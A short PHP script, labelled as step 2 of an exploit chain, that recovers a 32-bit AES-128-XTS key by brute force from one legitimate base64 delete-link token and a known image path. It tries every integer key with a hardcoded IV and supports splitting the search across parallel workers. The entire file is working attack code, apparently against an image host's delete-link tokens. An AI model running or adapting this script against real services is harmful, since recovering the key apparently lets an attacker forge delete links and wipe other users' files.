<?php
// EI2-02 step 2 - offline 32-bit key recovery from ONE legitimate delete link.
// Usage: php recover_key.php "<LEGIT_BASE64_TOKEN>" "/i/2026/09/29/canary.png" [start] [step]
// (start/step implement worker sharding: worker k uses start=k, step=<num_workers>)
$token = $argv[1];
$known = $argv[2];
$start = (int)($argv[3] ?? 0);
$step  = (int)($argv[4] ?? 1);
$ct = base64_decode($token);
for ($i = $start; $i < 4294967296; $i += $step) {
    $pt = openssl_decrypt($ct, 'AES-128-XTS', (string)$i, 0, 'sciCuBC7orQtDhTO');
    if ($pt === $known) { echo "FOUND key=$i\n"; exit(0); }   // full-plaintext equality
}
